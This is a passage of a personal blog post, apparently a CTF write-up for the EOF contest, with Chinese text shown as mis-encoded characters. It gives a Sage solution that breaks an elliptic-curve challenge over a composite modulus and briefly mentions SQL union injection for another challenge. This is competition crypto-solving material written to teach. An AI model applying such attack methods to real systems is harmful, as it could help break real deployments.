<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sage.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> p, q, flag</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> isPrime(p) <span class="keyword">and</span> isPrime(q)</span><br><span class="line">n = p * q</span><br><span class="line">a, b = matrix(ZZ, [[p, <span class="number">1</span>], [q, <span class="number">1</span>]]).solve_right(</span><br><span class="line">    vector([p**<span class="number">2</span> - p**<span class="number">3</span>, q**<span class="number">2</span> - q**<span class="number">3</span>])</span><br><span class="line">)</span><br><span class="line">E = EllipticCurve(Zmod(n), [a, b])</span><br><span class="line">G = E(p, p) + E(q, q)</span><br><span class="line">C = bytes_to_long(flag) * G</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;a = &#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;b = &#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;C =&quot;</span>, C.xy())</span><br></pre></td></tr></table></figure>
<p>å£“ç·šè§£å‡ºä¾†ï¼Œæœ‰å¤ æ¥µé™ï¼Œé‚£æ™‚å€™ç®—åˆ°æ›æ‰é‚„å»ticketç™¼ç˜‹<br>é¦–å…ˆå°±æ˜¯ç®—pã€qï¼Œç›´æ¥ç”¨ sage è§£é‚£å€‹ä¸‰æ¬¡æ–¹ç¨‹å¼ï¼Œä¸éè¦å–çš„æ˜¯é‚£å…©å€‹æ­£æ ¹ï¼Œå› ç‚ºpã€qæ˜¯è³ªæ•¸ï¼Œä¸€å®šæ˜¯æ­£çš„ã€‚</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sage.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">x, y = var(<span class="string">&#x27;x y&#x27;</span>)</span><br><span class="line"></span><br><span class="line">a = -<span class="number">1049512290645561483277399447040672259507710914145558231422452159145941450861058912834056552784840698307176425328594627265181382568207073595223799102540059103656850409121714215271402071402990265653829990643814289333297114436290307127182601793045470624406368512814269833830187545236393724608995894644699923989</span></span><br><span class="line">b = <span class="number">330613225413866308562655832653992432640737790102976283577689980446254238304479688134993945656361409867735093176372274589048066502491030816811279723518019832240148759433890104257541015694288688653084062998961288644429744942281764740765767448933787468732728303440425139427370295303413074746846731173227818565326124721081874768870022303341674817123171380954318218908360567200188035652004143989131725183710453256926775457844063169319469</span></span><br><span class="line"></span><br><span class="line">eq4 = x**<span class="number">2</span> - x**<span class="number">3</span> - a*x == b</span><br><span class="line">eq5 = y**<span class="number">2</span> - y**<span class="number">3</span> - a*y == b</span><br><span class="line"></span><br><span class="line">solution = solve([eq4, eq5], x, y, solution_dict=<span class="literal">True</span>)</span><br><span class="line">positive_roots = <span class="built_in">filter</span>(<span class="keyword">lambda</span> sol: sol[x] &gt; <span class="number">0</span> <span class="keyword">and</span> sol[y] &gt; <span class="number">0</span>, solution)</span><br><span class="line">x_val = positive_roots[<span class="number">0</span>][x]</span><br><span class="line">y_val = positive_roots[<span class="number">0</span>][y]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;x =&quot;</span>, x_val)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;y =&quot;</span>, y_val)</span><br></pre></td></tr></table></figure>
<p>é€™æ¨£å°±å¯ä»¥è§£å‡ºpã€qäº†</p>
<p>ç„¶å¾Œé–‹å§‹è§£æ±º<br>ä»–å»ºç«‹äº†<br>$y^2 \equiv x^3+ax+b \pmod n$<br>ä¸¦å»ºç«‹åœ¨æ©¢åœ“æ›²ç·šä¸Šé¸æ“‡äº†å…©å€‹é»$(p,p)$å’Œ $(q,q)$ï¼Œç„¶å¾Œé€²è¡Œäº†ç¾¤é‹ç®—ã€‚<br>é‚£æ™‚å€™å‰©ä¸‹å¤§æ¦‚å‰©ä¸‹å…©å°æ™‚çªç„¶æƒ³åˆ°æœ‰é€™å€‹å¯ä»¥åƒè€ƒã€‚<br><a target="_blank" rel="noopener" href="https://github.com/diogoaj/ctf-writeups/blob/master/2017/picoctf/cryptography/ECC2-200/README.md">https://github.com/diogoaj/ctf-writeups/blob/master/2017/picoctf/cryptography/ECC2-200/README.md</a></p>
<p>ç¸½è€Œè¨€ä¹‹å°±æ˜¯è¦ç®—å‡ºGä¸”ç®—å‡ºæ©¢åœ“æ›²ç·šçš„orderçš„è³ªå› æ•¸ä¸¦å°ä»–å€‘åšECC DLP(pã€qéƒ½è¦åšä¸€æ¬¡)ï¼Œä¸¦ä¸”è¦å°æ‰€æœ‰çš„è³ªå› æ•¸å’Œç®—å‡ºä¾†çš„éƒ½åš<code>CRT</code>ï¼Œä¹‹å¾Œå†æŠŠCRTçš„å€¼å’Œpqå…©å€‹çš„orderå†åšä¸€æ¬¡CRT(é‚£æ™‚å€™å°‘åšé€™ä¸€æ¢ï¼Œç®—å‡ºå¥‡æ€ªæ±è¥¿www)</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">discrete_log(<span class="built_in">int</span>(G.order())//<span class="built_in">int</span>(fac)*C, <span class="built_in">int</span>(G.order())//<span class="built_in">int</span>(fac)*G, operation=<span class="string">&quot;+&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>æœ€å¾Œç®—å‡ºä¾†çš„æ‹¿å»è½‰å›byteså°±è¡Œäº†</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">57366797191231613035327741961845991344248661489459273665787893494679511245498164076089068791122584458195315239399543984814150684970509045350166875864014581887869</span><br></pre></td></tr></table></figure>
<p><div class="img-item" data-src="https://hackmd.io/_uploads/rJenYs9Oa.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/rJenYs9Oa.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div><br>å£“ç·š17åˆ†é˜æå‡ºä¾†</p>
<h2 id="æ„Ÿæƒ³"><a href="#æ„Ÿæƒ³" class="headerlink" title="æ„Ÿæƒ³"></a>æ„Ÿæƒ³</h2><p>é€™æ¬¡EOFè¶…å¿«æ¨‚çš„ï¼Œæ‰“å¾—æ¯”æˆ‘é è¨ˆçš„é‚„è¦å¥½å¾ˆå¤šï¼ŒåŸæœ¬ä»¥ç‚ºå¤§æ¦‚åœ¨70å¹¾åå·¦å³wwwã€‚<br>å–®äººè³½çœŸçš„ç¡¬å‘€ï¼Œç¬¬ä¸€å¤©å› ç‚ºæ„Ÿå†’æ‰€ä»¥åªè§£å‡ºäº†webç¬¬ä¸€é¡Œï¼Œä¹‹å¾Œç‹€æ…‹å¥½äº†é™¸é™¸çºŒçºŒå°±é–‹å§‹æƒ³å‡ºä¾†ã€‚<br>ç¬¬äºŒå¤©ï¼Œè§£å‡ºäº†ä¸€é¡Œwebè·Ÿcryptoï¼Œnginxé‚£é¡Œæˆ‘åªèƒ½èªªï¼Œè¶…ç´šé…·ï¼Œæ„Ÿæ©orangeçš„blogã€‚<br>æœ€å¾Œä¸€å¤©ç‹€æ…‹è »å¥½çš„ï¼ŒæŠŠå¾ˆå¤šé¡Œç›®éƒ½æƒ³å‡ºä¾†ï¼Œç‹€æ…‹æ©Ÿæ˜¯çœŸçš„ç¹ç‘£ï¼Œ<del>ä¸éå› ç‚ºæˆ‘æ˜¯å·¥äººæ™ºæ…§ï¼Œæ‰€ä»¥ç®—çš„å‡ºä¾†</del>ã€‚å¦å¤–æ˜¯é‚£å€‹RSAï¼Œè¢«è©æ¬ºäº†å…©å¤©ï¼Œæ ¹æœ¬ä¸ç”¨ä¸‹é¢çš„xoré‹ç®—wwwã€‚<br>æœ€å¾Œèƒ½ç®—å‡ºECCè¶…è®šçš„ï¼Œå£“ç·šç®—å‡ºä¾†ï¼ŒåŸæœ¬å·®ä¸€é»é»ï¼Œæœ€å¾Œ17åˆ†é˜å£“ç·šè§£å‡ºä¾†ï¼Œç›´æ¥è¡åˆ°42ã€‚(å‰å…©å¤©ä¸€ç›´åœ¨é‚Šç·£å¾˜å¾ŠçœŸçš„å¾ˆç·Šå¼µï¼Œå£“åŠ›é —å¤§)</p>
<ul>
<li>ä¸écopypastaé‚£é¡ŒçœŸçš„å·®ä¸€é»é»å•ŠQQï¼Œå¦‚æœèƒ½çœ‹å‡ºformat stringå¯ä»¥å¡æ±è¥¿ï¼Œå°±å¯ä»¥ç›´æ¥å½é€ session+Union injectionè§£å‡º500åˆ†++</li>
<li>ç„¶å¾Œæˆ‘è¦æŠ±æ€¨webè·Ÿreverseæ‰“å‡ºä¾†çš„é¡Œè²¶å€¼å¥½å¿«ï¼Œåæ¬¡ä¸€ç›´æ‰www</li>
<li>é€™æ¬¡çš„æ¯”è³½è®“æˆ‘è¦ºå¾—æˆ‘çœŸçš„æœ‰é€²æ­¥ï¼Œå°¤å…¶æ˜¯webè·Ÿcryptoï¼Œä¸€å€‹è§£å‡ºå…©é¡Œ+å·®é»è§£å‡ºç¬¬ä¸‰é¡Œï¼Œä»¥åŠè§£å‡ºä¸‰é¡Œã€‚</li>
<li>æ±ºè³½åŠ æ²¹ï¼Œå¸Œæœ›å¯ä»¥æ‰“é€²å‰å¹¾</li>
</ul>
<p>æœ€å¾Œæ”¾å¼µè§£å‡ºä¾†çš„å…¨åœ–</p>
<p><div class="img-item" data-src="https://hackmd.io/_uploads/H1AG1n9Oa.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/H1AG1n9Oa.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>

            </div>

            <!-- Post information -->
            
            
    <div class="col-lg-8 offset-lg-2 col-md-10 offset-md-1">
        <ul class="pagination d-block text-center">
            
                <li class="previous page-item d-inline"><a href="/2024/02/29/QuantumCTF-CLASS/" class="page-link float-left">&larr;  Newer</a></li>
            
            
                <li class="next page-item d-inline"><a href="/2024/02/29/CGGC-WP/" class="page-link float-right">Older  &rarr;</a></li>
            
        </ul>
    </div>


            
                <!-- Comments -->
                

                

            

        </div>
    </div>
</article> 


    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.css">
    <style>
        #toc-content .toc-link::before {
            background-color: transparent;
            max-height: 25px;
        }

        #toc-content .toc-link.is-active-link::before {
            background-color: #404040;
        }
    </style>
    <script src="//cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.min.js"></script>
    <div class="ui-toc dropup scrollspy-body pull-right" style="right: 3%;">
        <button type="button" class="toc-btn btn btn-light" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false" data-display="static">
            <i class="fas fa-list"></i>
        </button>
        <div class="dropdown-menu dropdown-menu-right p-2"  aria-labelledby="tocLabel">
            <div class="toc-widget">
                <div id="toc-content" class="text-truncate">
                </div>
            </div>
            <div class="toc-menu pt-3 pl-4">
                <a class="expand-toggle d-block py-1" href="#"><span class="expand-text">Expand all</span><span class="close-text" style="display: none;">Collapse all</span></a>
                <a class="back-to-top d-block py-1" href="#">Back to top</a>
                <a class="go-to-bottom d-block py-1" href="#">Go to bottom</a>
            </div>
        </div>
    </div>
    <script>
        tocbot.init({
            // Where to render the table of contents.
            tocSelector: '#toc-content',
            // Where to grab the headings to build the table of contents.
            contentSelector: 'article',
            // Which headings to grab inside of the contentSelector element.
            headingSelector: 'h1, h2, h3',
            // For headings inside relative or absolute positioned containers within content.
            hasInnerContainers: true,
        });
    </script>


    


    <!-- Footer -->
    <hr />

<!-- Footer -->
<footer id="footer">
    <div class="container">
        <div class="row">
            <div class="col-lg-8 offset-lg-2 col-md-10 offset-md-1 text-center">
                <ul class="list-inline">
                    

                    

                    
                        <li class="list-inline-item">
                            <a rel="external" href="https://github.com/Naupjjin" target="_blank">
                                <span class="fa-stack fa-lg">
                                    <i class="fa fa-circle fa-stack-2x"></i>
                                    <i class="fab fa-github fa-stack-1x fa-inverse"></i>
                                </span>
                            </a>
                        </li>
                    

                    

                    
                        <li class="list-inline-item">
                            <a rel="external" href="mailto:naup96721@gmail.com" target="_blank">
                                <span class="fa-stack fa-lg">
                                    <i class="fa fa-circle fa-stack-2x"></i>
                                    <i class="far fa-envelope fa-stack-1x fa-inverse"></i>
                                </span>
                            </a>
                        </li>
                    

                    
                </ul>
                <ul class="copyright footer-menu list-inline">
                    
                    
                        <li class="list-inline-item">
                            
                            
                            <a href="/">
                                
                                    Home
                                
                            </a>
                        </li>
                    
                        <li class="list-inline-item">
                            
                                <span class="copyright-split">&nbsp;|&nbsp;</span>
                            
                            
                            <a href="/archives">
                                
                                    Archives
                                
                            </a>
                        </li>
                    
                        <li class="list-inline-item">
                            
                                <span class="copyright-split">&nbsp;|&nbsp;</span>
                            
                            
                            <a href="/tags">
                                
                                    Tags
                                
                            </a>
                        </li>
                    
                        <li class="list-inline-item">
                            
                                <span class="copyright-split">&nbsp;|&nbsp;</span>
                            
                            
                            <a href="/categories">
                                
                                    Categories
                                
                            </a>
                        </li>
                    
                        <li class="list-inline-item">
                            
                                <span class="copyright-split">&nbsp;|&nbsp;</span>
                            
                            
                            <a href="/about">
                                
                                    About
                                
                            </a>
                        </li>
                    
                </ul>
                <p class="copyright footer-author">
                    &copy; -2024 
                    <a rel="external" class="copyright-link" href="" target="_blank">Naupå ‡å§¬</a><br/>
                    Powered by <a rel="external" class="copyright-link" href="https://hexo.io/" target="_blank">Hexo</a>  
                    <span class="copyright-split">&nbsp;|&nbsp;&nbsp;</span>
                    Theme <a rel="external" class="copyright-link" href="https://github.com/luswdev/hexo-theme-clean.git" target="_blank">Clean</a>
                    
                    
                </p>
            </div>
        </div>
    </div>
</footer>


    <!-- After footer scripts -->
    <!-- jQuery -->
<script src="//cdn.jsdelivr.net/npm/jquery@2.1.4/dist/jquery.min.js"></script>

<!-- For drop down -->
<script src="//cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js"></script>

<!-- Bootstrap -->
<script src="//cdn.jsdelivr.net/npm/bootstrap@4.4.1/dist/js/bootstrap.min.js"></script>
<!-- Gallery -->
<script src="//cdn.jsdelivr.net/npm/lightgallery@1.6.11/dist/js/lightgallery-all.min.js"></script>
<!-- Busuanzi -->


<!-- Search script -->

<script src="/js/search.js"></script>

<script type="text/javascript">
    $(function () {
        searchFunc( '/search.xml' , 'searchInput', 'searchResult');
    });
</script>



<script src="/js/main.js"></script>



    <!-- Search Modal -->
    <!-- Modal -->
<div class="modal fade" id="searchModal" tabindex="-1" role="dialog" aria-labelledby="myModalLabel">
    <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
        <div class="modal-content overflow-auto">
            <div class="modal-header">
                <input type="text" class="form-control" placeholder="Searching Keywords..." id="searchInput">
                <button type="button" class="close" data-dismiss="modal" aria-label="Close"><i class="fas fa-times"></i></button>
            </div>
            <div class="modal-body">
                <div id="searchResult">
                    <div class="search-empty text-center text-muted p-5">
                        <i class="far fa-meh"></i>
                    </div>
                </div>
            </div> 
        </div>
    </div>
</div>


</body>
</html>